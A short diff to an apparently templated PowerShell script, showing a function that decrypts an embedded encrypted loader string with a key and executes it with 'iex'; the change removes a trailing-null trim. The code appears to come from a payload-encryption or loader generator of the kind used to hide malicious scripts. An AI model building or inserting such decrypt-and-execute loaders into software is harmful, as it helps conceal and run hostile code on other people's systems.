@@ -57,7 +57,7 @@ function Get-CheckHash($payload, $payload_hash, $minus_bytes) {{
 function Get-CodeExecution($key, $payload){{
 	$encryptedString = "{3}"
 	$decrypted_loader = Get-DecryptedString $key $encryptedString
-    $decoded_loader = [System.Text.Encoding]::ASCII.GetString($decrypted_loader).Trim([char]0)
+    $decoded_loader = [System.Text.Encoding]::ASCII.GetString($decrypted_loader)
     iex $decoded_loader
 }}
 
